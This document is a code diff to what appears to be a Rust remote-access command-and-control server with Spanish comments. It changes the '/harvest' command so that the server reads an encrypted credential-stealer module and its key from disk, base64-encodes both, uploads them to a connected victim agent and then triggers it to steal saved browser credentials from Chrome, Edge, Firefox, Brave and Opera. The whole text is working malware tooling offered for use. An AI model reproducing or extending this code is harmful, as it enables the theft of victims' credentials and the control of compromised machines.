@@ -818,19 +818,82 @@ async fn main() {
                         
                         if let Some(client) = clients.get(&id) {
                             info!("[{}] Comando /harvest: Robando credenciales de browsers", id);
-                            if let Err(e) = client.tx.send("__STEAL__".to_string()) {
-                                error!("[{}] Error enviando comando harvest: {}", id, e);
+                            
+                            // Verificar que existan los archivos del módulo
+                            let stealer_enc_path = "modules/stealer.enc";
+                            let stealer_key_path = "modules/stealer.key";
+                            
+                            if !Path::new(stealer_enc_path).exists() {
+                                println!("{}", "❌ Error: modules/stealer.enc no encontrado".bright_red());
+                                println!("{}", "   Genera el módulo con: cd builder && cargo run -- encrypt-module".bright_yellow());
+                                continue;
+                            }
+                            
+                            if !Path::new(stealer_key_path).exists() {
+                                println!("{}", "❌ Error: modules/stealer.key no encontrado".bright_red());
+                                println!("{}", "   Genera el módulo con: cd builder && cargo run -- encrypt-module".bright_yellow());
+                                continue;
+                            }
+                            
+                            // Leer archivos
+                            let dll_data = match fs::read(stealer_enc_path) {
+                                Ok(data) => data,
+                                Err(e) => {
+                                    println!("{} Error leyendo stealer.enc: {}", "❌".bright_red(), e);
+                                    continue;
+                                }
+                            };
+                            
+                            let key_data = match fs::read(stealer_key_path) {
+                                Ok(data) => data,
+                                Err(e) => {
+                                    println!("{} Error leyendo stealer.key: {}", "❌".bright_red(), e);
+                                    continue;
+                                }
+                            };
+                            
+                            println!();
+                            println!("{}", "╔═══════════════════════════════════════════════════════════╗".bright_red());
+                            println!("{}", format!("║           🔑 HARVESTING CREDENTIALS [{}]", id).bright_red().bold());
+                            println!("{}", "╚═══════════════════════════════════════════════════════════╝".bright_red());
+                            println!();
+                            println!("{}", "  📤 Subiendo stealer.enc...".bright_yellow());
+                            
+                            // Subir DLL encriptada
+                            let encoded_dll = base64_encode(&dll_data);
+                            let upload_dll_cmd = format!("__UPLOAD__|stealer.enc|{}", encoded_dll);
+                            if let Err(e) = client.tx.send(upload_dll_cmd) {
+                                error!("[{}] Error enviando stealer.enc: {}", id, e);
                                 println!("{} {}", "❌ Error:".bright_red().bold(), e);
-                            } else {
-                                println!();
-                                println!("{}", "╔═══════════════════════════════════════════════════════════╗".bright_red());
-                                println!("{}", format!("║           🔑 HARVESTING CREDENTIALS [{}]", id).bright_red().bold());
-                                println!("{}", "╚═══════════════════════════════════════════════════════════╝".bright_red());
-                                println!();
-                                println!("{}", "  🕵️  Robando credenciales de browsers...".bright_yellow());
-                                println!("{}", "  🎯 Chrome, Edge, Firefox, Brave, Opera".bright_white().dimmed());
-                                println!("{}", "  ⏳ Esperando respuesta del agente...".bright_white().dimmed());
-                                println!();
+                                continue;
+                            }
+                            
+                            // Esperar un poco para que se suba
+                            std::thread::sleep(std::time::Duration::from_millis(200));
+                            
+                            println!("{}", "  � Subiendo stealer.key...".bright_yellow());
+                            
+                            // Subir clave
+                            let encoded_key = base64_encode(&key_data);
+                            let upload_key_cmd = format!("__UPLOAD__|stealer.key|{}", encoded_key);
+                            if let Err(e) = client.tx.send(upload_key_cmd) {
+                                error!("[{}] Error enviando stealer.key: {}", id, e);
+                                println!("{} {}", "❌ Error:".bright_red().bold(), e);
+                                continue;
+                            }
+                            
+                            // Esperar un poco
+                            std::thread::sleep(std::time::Duration::from_millis(200));
+                            
+                            println!("{}", "  🚀 Ejecutando stealer...".bright_yellow());
+                            println!("{}", "  🎯 Chrome, Edge, Firefox, Brave, Opera".bright_white().dimmed());
+                            println!("{}", "  ⏳ Esperando credenciales...".bright_white().dimmed());
+                            println!();
+                            
+                            // Enviar comando de harvest
+                            if let Err(e) = client.tx.send("__HARVEST__".to_string()) {
+                                error!("[{}] Error enviando comando __HARVEST__: {}", id, e);
+                                println!("{} {}", "❌ Error:".bright_red().bold(), e);
                             }
                         } else {
                             println!("{} Cliente {} desconectado", "❌".bright_red(), id);
